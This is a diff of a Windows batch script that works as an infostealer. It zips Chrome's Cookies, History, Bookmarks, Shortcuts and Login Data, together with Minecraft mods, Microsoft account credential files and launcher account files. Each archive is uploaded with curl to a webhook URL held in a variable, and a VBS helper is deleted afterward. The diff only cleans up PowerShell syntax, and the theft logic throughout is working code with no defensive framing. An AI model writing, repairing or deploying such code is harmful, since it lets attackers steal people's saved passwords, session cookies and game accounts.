@@ -80,41 +80,43 @@ cd %USERPROFILE%
 
 
 :: Compress and upload various browser and application data
-powershell "Compress-Archive %APPDATA%\.minecraft\mods %APPDATA%\modss.zip -CompressionLevel 'Fastest'"
+:: Compress and upload various browser and application data
+powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\mods' -DestinationPath '%APPDATA%\modss.zip' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%APPDATA%\modss.zip" %webhook%
 
-powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies %USERPROFILE%\ChromeCookies.zip -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies' -DestinationPath '%USERPROFILE%\ChromeCookies.zip' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\ChromeCookies.zip" %webhook%
 
-powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\History %USERPROFILE%\ChromeHistory.zip -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\History' -DestinationPath '%USERPROFILE%\ChromeHistory.zip' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\ChromeHistory.zip" %webhook%
 
-powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\Shortcuts %USERPROFILE%\ChromeShortcuts.zip -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Shortcuts' -DestinationPath '%USERPROFILE%\ChromeShortcuts.zip' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\ChromeShortcuts.zip" %webhook%
 
-powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks %USERPROFILE%\ChromeBookmarks.zip -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks' -DestinationPath '%USERPROFILE%\ChromeBookmarks.zip' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\ChromeBookmarks.zip" %webhook%
 
-powershell "Compress-Archive %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data %USERPROFILE%\ChromeLoginData.zip -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data' -DestinationPath '%USERPROFILE%\ChromeLoginData.zip' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\ChromeLoginData.zip" %webhook%
 
-powershell "Compress-Archive %APPDATA%\.minecraft\launcher_msa_credentials.bin %USERPROFILE%\launcher_msa_credentials.bin -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_msa_credentials.bin' -DestinationPath '%USERPROFILE%\launcher_msa_credentials.bin' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\launcher_msa_credentials.bin" %webhook%
 
-powershell "Compress-Archive %APPDATA%\.minecraft\launcher_msa_credentials_microsoft_store.bin %USERPROFILE%\launcher_msa_credentials_microsoft_store.bin -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_msa_credentials_microsoft_store.bin' -DestinationPath '%USERPROFILE%\launcher_msa_credentials_microsoft_store.bin' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\launcher_msa_credentials_microsoft_store.bin" %webhook%
 
-powershell "Compress-Archive %APPDATA%\.minecraft\launcher_accounts.json %USERPROFILE%\launcher_accounts.json -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_accounts.json' -DestinationPath '%USERPROFILE%\launcher_accounts.json' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\launcher_accounts.json" %webhook%
 
-powershell "Compress-Archive %APPDATA%\.minecraft\launcher_accounts_microsoft_store.json %USERPROFILE%\launcher_accounts_microsoft_store.json -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_accounts_microsoft_store.json' -DestinationPath '%USERPROFILE%\launcher_accounts_microsoft_store.json' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\launcher_accounts_microsoft_store.json" %webhook%
 
-powershell "Compress-Archive %APPDATA%\.minecraft\launcher_product_state.json %USERPROFILE%\launcher_product_state.json -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_product_state.json' -DestinationPath '%USERPROFILE%\launcher_product_state.json' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\launcher_product_state.json" %webhook%
 
-powershell "Compress-Archive %APPDATA%\.minecraft\launcher_profiles.json %USERPROFILE%\launcher_profiles.json -CompressionLevel 'Fastest'"
+powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_profiles.json' -DestinationPath '%USERPROFILE%\launcher_profiles.json' -CompressionLevel 'Fastest'"
 curl -v -F "file=@%USERPROFILE%\launcher_profiles.json" %webhook%
+
 
 :: Clean up downloaded and temporary files
 del script.vbs
